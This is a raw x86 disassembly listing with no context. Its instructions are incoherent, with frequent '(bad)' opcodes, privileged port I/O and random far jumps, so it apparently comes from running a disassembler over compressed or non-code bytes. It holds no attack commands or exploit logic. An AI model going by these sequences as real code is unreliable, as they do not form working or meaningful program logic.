  4274ae:	xchg   ecx,eax
  4274af:	scas   al,BYTE PTR es:[edi]
  4274b0:	ins    DWORD PTR es:[edi],dx
  4274b1:	shr    DWORD PTR [ebp+esi*4-0x3f],cl
  4274b5:	cwde   
  4274b6:	push   0xffffff99
  4274b8:	shl    BYTE PTR [ebp-0x5d],1
  4274bb:	leave  
  4274bc:	(bad)  
  4274be:	dec    esp
  4274bf:	pop    esp
  4274c0:	(bad)  
  4274c1:	push   ebx
  4274c2:	jno    0x427525
  4274c4:	int    0x43
  4274c6:	and    esp,DWORD PTR [ebp-0x52]
  4274c9:	loopne 0x42747a
  4274cb:	stc    
  4274cc:	imul   esi,eax,0x503e332c
  4274d2:	lock push ds
  4274d4:	je     0x4274c8
  4274d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274d7:	sahf   
  4274d8:	inc    edx
  4274d9:	sar    ch,cl
  4274db:	pop    edi
  4274dc:	cld    
  4274dd:	aad    0xa1
  4274df:	test   eax,0x64447968
  4274e4:	pop    edx
  4274e5:	out    0xc0,eax
  4274e7:	push   edi
  4274e8:	(bad)  
  4274e9:	(bad)  
  4274ea:	ss cli 
  4274ec:	xchg   ebx,eax
  4274ed:	sub    eax,0xa5dbb623
  4274f2:	xor    al,0x38
  4274f4:	stos   BYTE PTR es:[edi],al
  4274f5:	push   es
  4274f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274f7:	mov    DWORD PTR [edi-0x73abbfb4],eax
  4274fd:	aaa    
  4274fe:	fstp   QWORD PTR [esp+ebp*1+0x767baf43]
  427505:	lds    ebx,FWORD PTR [edi+0x5f70a4aa]
  42750b:	mov    eax,esi
  42750d:	clc    
  42750e:	pop    eax
  42750f:	popf   
  427510:	push   esi
  427511:	pop    esp
  427512:	inc    esp
  427513:	icebp  
  427514:	push   ss
  427515:	pop    edx
  427516:	or     eax,0xe6a28af8
  42751b:	or     DWORD PTR [ebx-0x4a],edx
  42751e:	(bad)  [edx+0x3e]
  427521:	mov    ds:0x5649af7f,eax
  427526:	test   al,0x9d
  427528:	mov    ah,0xf3
  42752a:	mov    bh,0x60
  42752c:	ins    DWORD PTR es:[edi],dx
  42752d:	dec    ebx
  42752e:	adc    bl,BYTE PTR [ecx+0x59]
  427531:	mov    bl,0xbc
  427533:	pop    ecx
  427534:	xchg   ebp,eax
  427535:	pop    edi
  427536:	retf   
  427537:	mov    ch,BYTE PTR [edx]
  427539:	mov    ch,0xa9
  42753b:	inc    eax
  42753c:	mov    eax,ds:0x6ab2a58
  427541:	mov    esi,0x78d094ab
  427546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427547:	in     eax,dx
  427548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427549:	mov    edi,ebp
  42754b:	cmp    al,0x18
  42754d:	pop    esi
  42754e:	ins    DWORD PTR es:[edi],dx
  42754f:	enter  0x6a54,0x60
  427553:	into   
  427554:	mov    al,ds:0x3ac4a953
  427559:	retf   0x1649
  42755c:	mov    ss,WORD PTR [edx]
  42755e:	xchg   ebx,eax
  42755f:	dec    edi
  427560:	xor    BYTE PTR [esi],bl
  427562:	sti    
  427563:	js     0x4275c3
  427565:	adc    al,0x16
  427567:	xchg   ebp,eax
  427568:	inc    edi
  427569:	test   cl,dl
  42756b:	ds jge 0x4275b0
  42756e:	(bad)  
  427570:	adc    DWORD PTR [edx-0x6a],0xfffffffc
  427574:	xor    DWORD PTR [eax],esp
  427576:	and    ah,cl
  427578:	leave  
  427579:	addr16 push ecx
  42757b:	jg     0x427569
  42757d:	mov    bh,0xc3
  42757f:	call   0xdd4c:0xd17fc3bd
  427586:	fs out dx,al
  427588:	mov    al,ah
  42758a:	dec    esi
  42758b:	ins    BYTE PTR es:[edi],dx
  42758c:	into   
  42758d:	cmp    ebp,DWORD PTR [edi]
  42758f:	lock push eax
  427591:	sub    ecx,DWORD PTR [esi]
  427593:	add    al,0x52
  427595:	cmp    eax,0x2cee9f9b
  42759a:	or     ebp,esi
  42759c:	aaa    
  42759d:	lahf   
  42759e:	sti    
  42759f:	cwde   
  4275a0:	push   eax
  4275a1:	cmp    al,0xb
  4275a3:	in     eax,0x57
  4275a5:	and    bl,BYTE PTR [ebx+0x31]
  4275a8:	jb     0x427585
  4275aa:	sbb    eax,0x7d90e8d8
  4275af:	and    dl,BYTE PTR [ecx+0x68]
  4275b2:	out    0xd4,al
  4275b4:	jmp    0x5312:0xe96f5a63
  4275bb:	ins    DWORD PTR es:[edi],dx
  4275bc:	(bad)  
  4275bd:	cs inc ebp
  4275bf:	mov    ch,0xc4
  4275c1:	jp     0x427594
  4275c3:	or     BYTE PTR [ebp-0x6e],ch
  4275c6:	jns    0x42762b
  4275c8:	pop    ss
  4275c9:	or     eax,0xa1b6b1c4
  4275ce:	ja     0x42762f
  4275d0:	sub    eax,0xa32786eb
  4275d5:	sbb    al,BYTE PTR [ebx+ebx*1-0x336ddbce]
  4275dc:	jnp    0x427627
  4275de:	jecxz  0x427613
  4275e0:	ror    BYTE PTR [edx+0x6706643b],1
  4275e6:	jnp    0x4275be
  4275e8:	lods   eax,DWORD PTR ds:[esi]
  4275e9:	jne    0x42759f
  4275eb:	mov    bh,0x1
  4275ed:	call   0x9fc7:0xb432a866
  4275f4:	dec    esi
  4275f5:	mov    ebp,DWORD PTR [ebp-0x25]
  4275f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275f9:	mov    edx,0xab66fff0
  4275fe:	inc    edx
  4275ff:	sbb    DWORD PTR [eax+0x5a],ecx
  427602:	fwait
  427603:	mov    ebp,edx
  427605:	xchg   esi,eax
  427606:	sbb    eax,0x8cc35dc1
  42760b:	jp     0x4275af
  42760d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42760e:	mov    bh,dl
  427610:	jae    0x4275bf
  427612:	sti    
  427613:	pop    ebx
  427614:	jnp    0x427671
  427616:	sub    BYTE PTR [edi+0x2896bd0c],bl
  42761c:	xor    edx,ecx
  42761e:	ss retf 
  427620:	das    
  427621:	adc    ah,al
  427623:	loope  0x427696
  427625:	lahf   
  427626:	retf   0xd09d
  427629:	clc    
  42762a:	out    0x10,al
  42762c:	add    BYTE PTR [edx+0x5bb178fc],dh
  427632:	push   ebp
  427633:	xchg   ecx,eax
  427634:	pusha  
  427635:	rcl    DWORD PTR [ecx+0x49],0x71
  427639:	push   es
  42763a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42763b:	cmc    
  42763c:	out    0x70,eax
  42763e:	ins    DWORD PTR es:[edi],dx
  42763f:	fistp  QWORD PTR [ecx-0x77858021]
  427645:	pop    edi
  427646:	xlat   BYTE PTR ds:[ebx]
  427647:	in     eax,0xe8
  427649:	shr    dl,1
  42764b:	pop    edx
  42764c:	iret   
  42764d:	mov    dl,0x7c
  42764f:	stc    
  427650:	pop    ebx
  427651:	in     al,0xb1
  427653:	fld    TBYTE PTR [ebx]
  427655:	xchg   edi,eax
  427656:	sbb    eax,esp
  427658:	or     al,0x33
  42765a:	add    BYTE PTR [ecx+0x77b4e3c],dl
  427660:	jb     0x42764d
  427662:	psrad  mm3,mm3
  427665:	mov    esp,0xa472fe34
  42766a:	jns    0x4276a6
  42766c:	imul   edx,DWORD PTR [ebx+esi*8+0x42206558],0x3fde3401
  427677:	(bad)  
  427678:	mov    dh,0x93
  42767a:	cmp    BYTE PTR [ecx],al
  42767c:	movsx  esp,bl
  42767f:	xor    esi,DWORD PTR [esi+0xa41006d]
  427685:	and    BYTE PTR [ebp+0x353ed3f4],cl
  42768b:	repnz mov BYTE PTR [ecx+0xd31f],dh
	...
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	mov    bl,0xcf
  4276a8:	into   
  4276a9:	mov    edx,0x1ec9e
  4276ae:	inc    BYTE PTR [ecx]
  4276b0:	add    BYTE PTR [eax],al
  4276b2:	mov    esp,0xb28aeb14
  4276b7:	adc    BYTE PTR [esi-0x4f772900],bh
  4276bd:	xor    al,BYTE PTR [ebp+0x26]
  4276c0:	mov    edi,0x1b206663
  4276c5:	dec    esp
  4276c6:	test   al,0x7a
  4276c8:	jle    0x4276d6
  4276ca:	push   0xffffffa0
  4276cc:	mov    esp,?
  4276ce:	lods   al,BYTE PTR ds:[esi]
  4276cf:	xor    esp,DWORD PTR [eax+ecx*8+0x5f]
  4276d3:	mov    ah,0x1f
  4276d5:	cmc    
  4276d6:	lods   al,BYTE PTR ds:[esi]
  4276d7:	push   ss
  4276d8:	adc    eax,DWORD PTR [edx]
  4276da:	jae    0x427748
  4276dc:	fwait
  4276dd:	inc    esp
  4276de:	add    eax,0x20e7b6a0
  4276e3:	bound  eax,QWORD PTR [edx+0x1b807f31]
  4276e9:	jno    0x427754
  4276eb:	mov    BYTE PTR [esi+0x573de8e5],0xd9
  4276f2:	aad    0xbf
  4276f4:	fsub   DWORD PTR [ebx+eiz*8-0x7b4a007c]
  4276fb:	pop    es
  4276fc:	sbb    ecx,ebx
  4276fe:	inc    ecx
  4276ff:	fcmovnb st,st(7)
  427701:	jecxz  0x427686
  427703:	je     0x42777f
  427705:	stc    
  427706:	add    DWORD PTR [edx],edi
  427708:	scas   al,BYTE PTR es:[edi]
  427709:	cld    
  42770a:	jae    0x4276cd
  42770c:	dec    esi
  42770d:	xchg   ebx,eax
  42770e:	mov    ecx,0xf6fd7464
  427713:	mov    eax,ds:0x9541d3f1
  427718:	test   eax,esp
  42771a:	add    BYTE PTR [esi-0x2c],bl
  42771d:	add    ecx,edi
  42771f:	mov    ecx,0x574c34f2
  427724:	test   DWORD PTR [esi],edi
  427726:	lahf   
  427727:	add    al,0xd
  427729:	mov    esp,0xfcb65f32
  42772e:	pop    es
  42772f:	call   0x844d:0x2093c923
  427736:	inc    esi
  427737:	or     DWORD PTR [ecx+0x2e6e9ac1],edx
  42773d:	aam    0x84
  42773f:	scas   al,BYTE PTR es:[edi]
  427740:	dec    ebp
  427741:	ret    
  427742:	loopne 0x42771d
  427744:	xchg   ebx,eax
  427745:	shl    DWORD PTR [esi+0x558210cd],1
  42774b:	int3   
  42774c:	rcr    BYTE PTR [ebx-0x6e],1
  42774f:	rcl    DWORD PTR [esi+esi*2+0x2a],1
  427753:	stos   BYTE PTR es:[edi],al
  427754:	test   eax,0xe125a7f5
  427759:	cmp    al,BYTE PTR [edx]
  42775b:	or     BYTE PTR [esi-0xd1fc933],ch
  427761:	and    eax,DWORD PTR [eax+eax*4+0x22c24fda]
  427768:	scas   al,BYTE PTR es:[edi]
  427769:	jp     0x42779e
  42776b:	in     al,dx
  42776c:	pop    es
  42776d:	sbb    bl,BYTE PTR [esi]
  42776f:	les    ecx,FWORD PTR [esp+ecx*1+0x60b0e138]
  427776:	bound  esp,QWORD PTR [ebx+eiz*1+0x59]
  42777a:	add    BYTE PTR [ebx+0x7e],bl
  42777d:	jne    0x42777b
  42777f:	push   0x74a6f2b6
  427784:	daa    
  427785:	hlt    
  427786:	jle    0x42775d
  427788:	xor    dh,BYTE PTR [ebp+ebx*4-0x29]
  42778c:	xor    esp,DWORD PTR [eax]
  42778e:	fwait
  42778f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427790:	icebp  
  427791:	stos   BYTE PTR es:[edi],al
  427792:	push   ebp
  427793:	push   esp
  427794:	aaa    
  427795:	jmp    0xdc9e:0x729442b7
  42779c:	je     0x427781
  42779e:	test   ch,0xbe
  4277a1:	inc    esp
  4277a2:	pusha  
  4277a3:	imul   esp,DWORD PTR [edx],0xe217046f
  4277a9:	jp     0x4277cd
  4277ab:	ja     0x427791
  4277ad:	jg     0x4277f7
  4277af:	push   esi
  4277b0:	jecxz  0x427802
  4277b2:	dec    edi
  4277b3:	pushf  
  4277b4:	lds    ebx,FWORD PTR [edi]
  4277b6:	daa    
  4277b7:	pop    esi
  4277b8:	mov    eax,0x663224cd
  4277bd:	(bad)  
  4277be:	call   0x6fd48cc9
  4277c3:	mov    al,0x91
  4277c5:	push   ds
  4277c6:	aad    0x83
  4277c8:	xor    DWORD PTR [edx+0x3b],eax
  4277cb:	pushf  
  4277cc:	mov    DWORD PTR [ecx+0x61],edx
  4277cf:	mov    bl,0xb0
  4277d1:	adc    BYTE PTR [ebx],0xb9
  4277d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277d5:	jecxz  0x427800
  4277d7:	mov    ebp,0xe7bf6c6e
  4277dc:	fsub   DWORD PTR [esi-0x13c62f9c]
  4277e2:	addps  xmm1,XMMWORD PTR [esi]
  4277e5:	iret   
  4277e6:	hlt    
  4277e7:	stc    
  4277e8:	pop    ebp
  4277e9:	test   DWORD PTR [ebx-0x1de0fdb9],0xc27f7a5a
  4277f3:	or     al,0xbd
  4277f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277f6:	aad    0xfb
  4277f8:	ja     0x4277e2
  4277fa:	and    al,0x82
  4277fc:	pop    es
  4277fd:	add    ah,BYTE PTR [edx-0x39]
  427800:	loopne 0x427811
  427802:	lods   eax,DWORD PTR ds:[esi]
  427803:	out    dx,eax
  427804:	cmp    BYTE PTR [ebx-0x8c914cf],dl
  42780a:	sub    eax,0x5c9fc0d1
  42780f:	mov    dl,0xce
  427811:	mov    ds,ebp
  427813:	cld    
  427814:	inc    ebx
  427815:	test   DWORD PTR [ecx+0x7c],edx
  427818:	push   ss
  427819:	sbb    dl,BYTE PTR [esp+eax*8+0x31]
  42781d:	ret    
  42781e:	or     dl,BYTE PTR [ecx]
  427820:	jae    0x427884
  427822:	mov    edi,0x9c4cc005
  427827:	inc    ebp
  427828:	jle    0x427838
  42782a:	mov    bh,0x4e
  42782c:	jae    0x42783b
  42782e:	adc    dl,al
  427830:	push   edi
  427831:	add    bl,BYTE PTR [eax]
  427833:	test   DWORD PTR ds:0x409caee3,ebx
  427839:	cwde   
  42783a:	pop    eax
  42783b:	jb     0x4277cd
  42783d:	iret   
  42783e:	push   edi
  42783f:	pop    ebx
  427840:	adc    ebp,DWORD PTR [ecx+0x56]
  427843:	ret    
  427844:	iret   
  427845:	or     eax,0xf9a039ff
  42784a:	jb     0x427803
  42784c:	das    
  42784d:	outs   dx,DWORD PTR ds:[esi]
  42784e:	shl    DWORD PTR [eax],1
  427850:	mov    al,ds:0x119c3631
  427855:	and    DWORD PTR [ecx],ebx
  427857:	in     eax,dx
  427858:	push   esi
  427859:	and    DWORD PTR [esi+0x4e381d01],ebp
  42785f:	cmp    bl,ah
  427861:	mov    DWORD PTR [ebp-0x29],ecx
  427864:	xor    al,0xdb
  427866:	sar    dh,cl
  427868:	cdq    
  427869:	push   cs
  42786a:	rol    DWORD PTR [ecx+edi*8+0x37ec20cc],1
  427871:	fld    DWORD PTR [ecx+0x7e]
  427874:	mov    ecx,0xc83f9d61
  427879:	cdq    
  42787a:	cli    
  42787b:	(bad)  
  42787c:	mov    esp,0xeaf4d481
  427881:	jne    0x427899
  427883:	mov    DWORD PTR [esi],eax
  427885:	dec    ecx
  427886:	dec    edx
  427887:	sbb    eax,ebp
  427889:	daa    
  42788a:	(bad)  
  42788c:	jbe    0x427900
  42788e:	in     al,dx
  42788f:	sub    eax,0x4724c916
  427894:	inc    eax
  427895:	push   esi
  427896:	adc    DWORD PTR [edx+0x6b157e8d],edx
  42789c:	pop    esp
  42789d:	or     DWORD PTR [edi],eax
  42789f:	or     BYTE PTR [ecx+0x28c3f309],cl
  4278a5:	dec    ebx
  4278a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278a7:	lahf   
  4278a8:	clc    
  4278a9:	push   ecx
  4278aa:	add    al,BYTE PTR [edi]
  4278ac:	adc    dl,cl
  4278ae:	aad    0xea
	...
  4278b8:	add    BYTE PTR [eax],al
  4278ba:	jns    0x4278c6
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	adc    cl,BYTE PTR [ebp-0x11639280]
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	inc    BYTE PTR [ecx]
  4278d0:	add    BYTE PTR [eax],al
  4278d2:	mov    ds:0x42b2b712,eax
  4278d7:	in     eax,0x3e
  4278d9:	sahf   
  4278da:	retf   
  4278db:	mov    ebp,0x4fe28cdf
  4278e0:	lea    esi,[ecx+0x5c7b7dc7]
  4278e6:	and    DWORD PTR [ebp-0x4c],0xffffff9b
  4278ea:	popf   
  4278eb:	(bad)  
  4278ec:	fild   DWORD PTR [edx]
  4278ee:	ja     0x42790c
  4278f0:	and    esi,esi
  4278f2:	cs ins DWORD PTR es:[edi],dx
  4278f4:	mov    BYTE PTR ds:0x99d8817e,bh
  4278fa:	test   DWORD PTR [ecx-0x7d],0x8696fcce
  427901:	cwde   
  427902:	jmp    0xfee9:0x6e8b3a4c
  427909:	push   edi
  42790a:	mov    DWORD PTR [esi-0x42b7b040],ecx
  427910:	push   ecx
  427911:	xchg   esp,eax
  427912:	aam    0xb7
  427914:	lock out 0x76,eax
  427917:	in     al,0x7f
  427919:	cmp    dh,dh
  42791b:	mov    gs,WORD PTR [ecx-0x69]
  42791e:	mov    eax,ds:0x918dd885
  427923:	sbb    al,0x6c
  427925:	sbb    al,0x20
  427927:	stos   BYTE PTR es:[edi],al
  427928:	jnp    0x427980
  42792a:	sub    BYTE PTR [esi-0x4e],ah
  42792d:	loope  0x427903
  42792f:	add    al,0x48
  427931:	push   ss
  427932:	ret    0x9a32
  427935:	cmc    
  427936:	or     esi,DWORD PTR [ecx]
  427938:	icebp  
  427939:	xlat   BYTE PTR ds:[ebx]
  42793a:	push   eax
  42793b:	push   ebx
  42793c:	fwait
  42793d:	cmp    DWORD PTR [edx],eax
  42793f:	sub    ah,0xdd
  427942:	js     0x4278d9
  427944:	es dec edi
  427946:	mov    eax,ds:0x6e47acf
  42794b:	push   cs
  42794c:	xchg   ebx,eax
  42794d:	int3   
  42794e:	ret    0xec54
  427951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427952:	adc    BYTE PTR [ebx-0x2881a41a],ch
  427958:	xchg   esi,eax
  427959:	mov    dh,BYTE PTR [edx]
  42795b:	adc    eax,DWORD PTR [edx-0x3419f761]
  427961:	stos   DWORD PTR es:[edi],eax
  427962:	bound  esp,QWORD PTR [edx+0x2c]
  427965:	in     eax,0xd2
  427967:	and    al,BYTE PTR [ebx+0x2f2091a9]
  42796d:	sub    BYTE PTR [edx+0xe],0xd8
  427971:	mov    cl,0x2d
  427973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427974:	ror    DWORD PTR [ebx],1
  427976:	shr    ebp,cl
  427978:	shr    dl,cl
  42797a:	dec    eax
  42797b:	stc    
  42797c:	push   ss
  42797d:	dec    esp
  42797e:	push   ecx
  42797f:	mov    edi,0xa8c81123
  427984:	sbb    eax,0x71303669
  427989:	and    edi,DWORD PTR [edi+esi*4+0x2a6849ce]
  427990:	dec    ebx
  427991:	or     edi,DWORD PTR [eax-0x23]
  427994:	mov    edx,0xeaab29de
  427999:	fisubr DWORD PTR [edx+0x17]
  42799c:	cmp    al,BYTE PTR [ebx]
  42799e:	lods   eax,DWORD PTR ds:[esi]
  42799f:	push   ds
  4279a0:	ins    DWORD PTR es:[edi],dx
  4279a1:	scas   eax,DWORD PTR es:[edi]
  4279a2:	mov    eax,0x65097e14
  4279a7:	pop    esp
  4279a8:	ficom  DWORD PTR [ecx]
  4279ab:	mov    ebx,0x6a022bc3
  4279b0:	or     ebp,ebp
  4279b2:	mov    eax,ds:0x3538ef18
  4279b7:	fcom   QWORD PTR [ecx+0x12b22d71]
  4279bd:	jae    0x427962
  4279bf:	in     al,0x6d
  4279c1:	imul   esp,DWORD PTR [ecx+0xe],0x34fe0b97
  4279c8:	or     al,bh
  4279ca:	push   cs
  4279cb:	pop    esp
  4279cc:	cmp    al,0x5c
  4279ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279cf:	ret    0x82c8
  4279d2:	bound  eax,QWORD PTR [esi-0x594980f8]
  4279d8:	mov    ds:0xad5d8d6c,al
  4279dd:	pop    ebx
  4279de:	cmp    edx,edi
  4279e0:	cmp    eax,DWORD PTR [ebp-0x3b]
  4279e3:	sbb    ch,BYTE PTR [esi]
  4279e5:	jge    0x427a4d
  4279e7:	lods   al,BYTE PTR ds:[esi]
  4279e8:	ja     0x4279ec
  4279ea:	jnp    0x427a3a
  4279ec:	adc    BYTE PTR [ebx+0x34],bh
  4279ef:	ja     0x4279a5
  4279f1:	out    0x7e,al
  4279f3:	jmp    0x4279d0
  4279f5:	cmp    cl,0xd4
  4279f8:	sbb    DWORD PTR [esi],edi
  4279fa:	and    al,0xac
  4279fc:	push   ebp
  4279fd:	pop    ecx
  4279fe:	xchg   esi,eax
  4279ff:	ja     0x4279db
  427a01:	test   DWORD PTR [ecx+0x3b6bb72f],esi
  427a07:	add    edi,ebx
  427a09:	ficom  DWORD PTR [edi-0x4be8c413]
  427a0f:	pop    eax
  427a10:	outs   dx,BYTE PTR ds:[esi]
  427a11:	ret    0x85ef
  427a14:	out    0x7d,al
  427a16:	cmp    BYTE PTR [esp+edx*1],bh
  427a19:	jbe    0x4279b5
  427a1b:	push   0x4d
  427a1d:	dec    ebx
  427a1e:	out    0x34,al
  427a20:	cli    
  427a21:	(bad)  
  427a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a23:	cmp    BYTE PTR [esi-0x48921072],al
  427a29:	mov    cl,0x9e
  427a2b:	gs add al,0x9b
  427a2e:	ret    0xa558
  427a31:	call   0xe34e:0x4fc3de30
  427a38:	xchg   edx,eax
  427a39:	call   0x279c9d4c
  427a3e:	call   0x4fa8:0x490d5a1d
  427a45:	push   cs
  427a46:	je     0x4279e5
  427a48:	sub    eax,0xec153f5b
  427a4d:	add    DWORD PTR [esi+eax*4],esi
  427a50:	repnz mov dl,0x90
  427a53:	bound  edi,QWORD PTR [edx+0x3d8632af]
  427a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a5a:	bound  edx,QWORD PTR ds:0x5ec56d28
  427a60:	shl    DWORD PTR [eax+0x22],1
  427a63:	popa   
  427a64:	cmp    dh,BYTE PTR [ecx-0xa8031d1]
  427a6a:	je     0x427a87
  427a6c:	xchg   esp,eax
  427a6d:	into   
  427a6e:	std    
  427a6f:	add    BYTE PTR [esp+edx*4+0x62bf1c6b],ah
  427a76:	and    ecx,DWORD PTR [edx]
  427a78:	rcl    DWORD PTR [ecx],cl
  427a7a:	mov    bl,0x4
  427a7c:	in     eax,dx
  427a7d:	push   ss
  427a7e:	(bad)  [ebp+0x16]
  427a81:	jge    0x427aef
  427a83:	cmp    BYTE PTR [eax],dh
  427a85:	imul   esp,DWORD PTR [edi],0x71
  427a88:	push   0x3e01e62b
  427a8d:	ret    0xe0fc
  427a90:	inc    al
  427a92:	mov    bh,BYTE PTR [eax]
  427a94:	sub    ecx,DWORD PTR [edx]
  427a96:	pop    eax
  427a97:	xchg   ecx,eax
  427a98:	rol    dl,0x6f
  427a9b:	and    eax,0xcace9378
  427aa0:	sub    DWORD PTR [esi],ebp
  427aa2:	call   0x1a45:0x4901634f
  427aa9:	mov    BYTE PTR [ebx+0x7c2379dc],cl
  427aaf:	(bad)  
  427ab0:	push   esi
  427ab1:	sbb    DWORD PTR [ecx+0x1a],edi
  427ab4:	dec    ecx
  427ab5:	loopne 0x427a7c
  427ab7:	mov    al,0x43
  427ab9:	dec    edx
  427aba:	fadd   DWORD PTR [edi]
  427abc:	mov    dh,0x7d
  427abe:	cld    
  427abf:	(bad)  
  427ac0:	stc    
  427ac1:	jmp    0x1925:0xa80eccff
  427ac8:	ss jmp 0x427aa5
  427acb:	mov    cs,edx
  427acd:	mov    al,ds:0x4ed
	...
  427ada:	pop    ecx
  427adb:	add    eax,ecx
  427add:	inc    esp
  427ade:	fcmovnb st,st(6)
  427ae0:	fstp   QWORD PTR [edi]
  427ae2:	arpl   WORD PTR [edi+0x1fbd4d6c],di
  427ae8:	jmp    0x427b69
  427aea:	call   0x1:0xfe0001f0
  427af1:	add    BYTE PTR [edx],dl
  427af3:	fwait
  427af4:	push   ds
  427af5:	sbb    DWORD PTR [ecx+0x6daf2a4a],0x3e5643ed
  427aff:	test   BYTE PTR [ebp-0x5c40d0e4],0xdf
  427b06:	pop    edx
  427b07:	int    0x21
  427b09:	dec    edx
  427b0a:	dec    esp
  427b0b:	jp     0x427b55
  427b0d:	pop    edi
  427b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b0f:	mov    ebp,edi
  427b11:	inc    ebx
  427b12:	inc    esi
  427b13:	add    DWORD PTR [ecx+0x1f3a8700],edi
  427b19:	mov    ch,0x68
  427b1b:	jecxz  0x427b28
  427b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b1e:	mov    al,ds:0xa27c9b8a
  427b23:	add    DWORD PTR [eax+0x4b],ebx
  427b26:	arpl   WORD PTR ds:[eax+0x36edecaa],bx
  427b2d:	push   esp
  427b2e:	out    0x48,eax
  427b30:	gs ins BYTE PTR es:[di],dx
  427b33:	int    0x22
  427b35:	ret    
  427b36:	cli    
  427b37:	fs std 
  427b39:	push   ebp
  427b3a:	addr16 and eax,0x5199f95b
  427b40:	rcl    DWORD PTR [edx],cl
  427b42:	jl     0x427b5e
  427b44:	dec    ebx
  427b45:	outs   dx,BYTE PTR ds:[esi]
  427b46:	pop    edx
  427b47:	adc    al,0x5a
  427b49:	dec    edx
  427b4a:	xor    ebx,DWORD PTR [ebx-0x28]
  427b4d:	adc    esp,DWORD PTR [ecx-0x5974c9af]
  427b53:	sbb    bh,BYTE PTR [eax+0x29b504a4]
  427b59:	mov    ds:0x973ec098,al
  427b5e:	in     al,dx
  427b5f:	imul   edx,DWORD PTR [eax],0xcc637300
  427b65:	sub    dh,BYTE PTR [edi]
  427b67:	jnp    0x427b35
  427b69:	icebp  
  427b6a:	cmp    DWORD PTR [ebx+0x45cb7b79],esp
  427b70:	and    DWORD PTR [eax+eax*2],0xffffffd0
  427b74:	dec    edi
  427b75:	in     al,0x1f
  427b77:	ds call 0xe945:0x7d52f7a5
  427b7f:	into   
  427b80:	or     BYTE PTR [ebp-0x59],ah
  427b83:	jno    0x427bea
  427b85:	adc    ah,0x8c
  427b88:	ret    
  427b89:	xchg   esi,eax
  427b8a:	mov    esp,0x6010fc7a
  427b8f:	sbb    al,0x84
  427b91:	arpl   WORD PTR [edx+0x621610f5],si
  427b97:	add    eax,0x742bec29
  427b9c:	ins    BYTE PTR es:[edi],dx
  427b9d:	ret    
  427b9e:	js     0x427bc9
  427ba0:	push   edx
  427ba1:	jecxz  0x427baf
  427ba3:	ret    
  427ba4:	loop   0x427c1b
  427ba6:	stc    
  427ba7:	icebp  
  427ba8:	iret   
  427ba9:	(bad)  
  427baa:	out    0x4c,al
  427bac:	hlt    
  427bad:	test   BYTE PTR [eax+0x3fac7cb0],0x2f
  427bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bb5:	test   DWORD PTR [ebp+0x16],0x7207dc8a
  427bbc:	mov    cl,0x7d
  427bbe:	cmp    dl,bl
  427bc0:	sub    eax,0x9f7b6b03
  427bc5:	push   ebp
  427bc6:	out    dx,eax
  427bc7:	mov    ah,0x2c
  427bc9:	out    dx,al
  427bca:	aas    
  427bcb:	ins    BYTE PTR es:[edi],dx
  427bcc:	in     eax,0x60
  427bce:	push   edi
  427bcf:	outs   dx,BYTE PTR ds:[esi]
  427bd0:	or     eax,0xabd9d64a
  427bd5:	pop    es
  427bd6:	outs   dx,DWORD PTR ds:[esi]
  427bd7:	xchg   esi,eax
  427bd8:	xor    DWORD PTR [ecx+0x747eb0a8],edx
  427bde:	and    esi,0xb163cf1e
  427be4:	mov    cl,0x80
  427be6:	xchg   edi,eax
  427be7:	(bad)  
  427be8:	mov    al,0x28
  427bea:	cdq    
  427beb:	jp     0x427c69
  427bed:	(bad)  [ebx+0x72]
  427bf0:	dec    esp
  427bf1:	xchg   esi,eax
  427bf2:	adc    eax,0x7e1811c7
  427bf7:	lock (bad) 
  427bf9:	mov    eax,ds:0x2261d267
  427bfe:	in     al,dx
  427bff:	stos   BYTE PTR es:[edi],al
  427c00:	jne    0x427be8
  427c02:	nop
  427c03:	sub    al,0x56
  427c05:	xor    DWORD PTR [edi-0x4bf149e],eax
  427c0b:	ret    
  427c0c:	arpl   WORD PTR [ecx+0x513eb7a5],cx
  427c12:	jbe    0x427be0
  427c14:	mov    al,BYTE PTR [eax+0x35]
  427c17:	clc    
  427c18:	es aas 
  427c1a:	push   ecx
  427c1b:	imul   ebx,DWORD PTR [ebp+ebp*1-0x75],0xb11baeb3
  427c23:	mov    ebx,0xf34f3b16
  427c28:	xchg   edx,eax
  427c29:	das    
  427c2a:	sbb    dl,BYTE PTR [esi-0x45]
  427c2d:	sar    DWORD PTR [ebx+0x57255d75],cl
  427c33:	retf   
  427c34:	mov    ebp,0x446b69a
  427c39:	dec    ecx
  427c3a:	aad    0xfb
  427c3c:	push   ss
  427c3d:	loope  0x427cb9
  427c3f:	mov    fs,WORD PTR [edx+edi*2+0xb]
  427c43:	xchg   edi,eax
  427c44:	mov    ebp,0x669ceb31
  427c49:	inc    eax
  427c4a:	or     edx,DWORD PTR [esi+0x5e122075]
  427c50:	(bad)
  427c54:	mov    eax,0xf86765bf
  427c59:	mov    esp,0x7e743602
  427c5e:	mov    ds:0xe44583dc,eax
  427c63:	adc    ebp,DWORD PTR [ebp+0x2c]
  427c66:	sub    al,0x46
